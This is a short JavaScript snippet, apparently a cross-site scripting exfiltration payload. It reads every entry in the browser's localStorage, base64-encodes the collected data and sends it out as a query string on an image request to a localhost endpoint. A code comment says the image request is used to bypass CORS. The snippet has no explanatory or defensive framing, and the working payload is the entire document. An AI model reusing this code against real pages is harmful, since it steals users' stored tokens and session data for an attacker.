const localStorageData = {};
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  if (key !== null) {
    const value = localStorage.getItem(key);
    localStorageData[key] = value;
  }
}

const jsonData = JSON.stringify(localStorageData);
const encodedData = btoa(jsonData);

// Send data via an image request to bypass CORS
const img = new Image();
img.src = `http://localhost/api?data=${encodeURIComponent(encodedData)}`;